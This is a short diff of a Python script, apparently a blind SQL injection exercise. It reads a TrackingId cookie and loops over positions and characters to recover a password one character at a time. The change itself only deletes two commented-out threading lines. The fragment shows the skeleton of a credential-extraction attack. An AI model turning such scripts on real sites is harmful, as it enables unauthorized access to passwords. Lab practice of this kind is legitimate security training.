@@ -32,9 +32,7 @@ def atacksqli():
     cookies_init = s.cookies.get_dict()
     trackingIdCookie = cookies_init['TrackingId']
     password = ''
-    #threads = []
     for position in range(1,40):
-        #thread = threading.Thread(target=findChar,args=(position))
         for char in characters:
             if char == ';' or char == '\n':
                 continue
